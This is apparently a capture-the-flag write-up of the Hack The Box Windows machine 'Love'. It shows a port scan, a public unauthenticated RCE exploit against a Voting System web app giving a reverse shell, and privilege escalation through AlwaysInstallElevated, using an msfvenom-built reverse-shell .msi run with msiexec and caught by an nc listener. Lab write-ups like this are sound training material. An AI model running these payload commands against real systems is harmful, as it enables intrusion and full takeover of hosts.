## Default Information
IP address : 10.10.10.239\
OS : Windows

## Discovery
Before we begin, let's first add the IP address ```10.10.10.239``` to ```love.htb``` in our ```/etc/hosts``` file. 

```
10.10.10.239    love.htb
```

### Nmap
Firstly, let us enumerate all the TCP open ports

```
Nmap scan report for love.htb (10.10.10.239)
Host is up, received user-set (0.35s latency).
Scanned at 2022-10-09 00:42:35 EDT for 66s
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack
135/tcp  open  msrpc        syn-ack
139/tcp  open  netbios-ssn  syn-ack
443/tcp  open  https        syn-ack
445/tcp  open  microsoft-ds syn-ack
3306/tcp open  mysql        syn-ack
5000/tcp open  upnp         syn-ack
```

### Enumerating Port 80
Navigating to http://love.htb:80, we notice that we are using Voting System and afterwards, we are able to find an unauthenticated remote code execution for Voting System from [here](https://www.exploit-db.com/exploits/49846)

Using the exploit script from [here](https://github.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE), we are able to execute a reverse shell connection

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/htb_labs/love/Voting-System-1.0-Unauth-RCE]
└─$ python3 exploit.py -t 10.10.10.239 -i 10.10.16.4 -r 80
/home/kali/Desktop/HTB/lib/python3.9/site-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (5.0.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe

C:\xampp\htdocs\omrs\images>
```

### Obtaining user.txt

```
C:\Users\Phoebe>whoami && hostname && ipconfig && type C:\Users\Phoebe\Desktop\user.txt
whoami && hostname && ipconfig && type C:\Users\Phoebe\Desktop\user.txt
love\phoebe
Love
Windows IP Configuration
Ethernet adapter Ethernet0 2:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.239
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
<Redacted user.txt>
```

### Privilege Escalation (administrator)
Using PowerUp.ps1, we realize that the ```AlwaysInstallElevated``` registry key is enabled. This means that we can install a ```.msi``` package to spawn a reverse shell connection with administrative privileges

```
Check         : AlwaysInstallElevated Registry Key
AbuseFunction : Write-UserAddMSI
```

Next, we will have to use ```msfvenom``` to create the malicious ```.msi``` package

```
┌──(kali㉿kali)-[~/Desktop/htb_labs/love]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=80 -f msi -o shell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi
```

Afterwards, we will transfer the ```shell.msi``` to the remote server and execute the payload using msiexec command

```
C:\temp>msiexec /quiet /qn /i C:\temp\shell.msi
msiexec /quiet /qn /i C:\temp\shell.msi
-----------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.239] 56213
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>
```

### Obtaining root.txt

```
C:\Users\Administrator\Desktop>hostname && whoami && ipconfig && type C:\Users\Administrator\Desktop\root.txt
hostname && whoami && ipconfig && type C:\Users\Administrator\Desktop\root.txt
Love
nt authority\system
Windows IP Configuration
Ethernet adapter Ethernet0 2:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.239
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
<Redacted root flag>
```
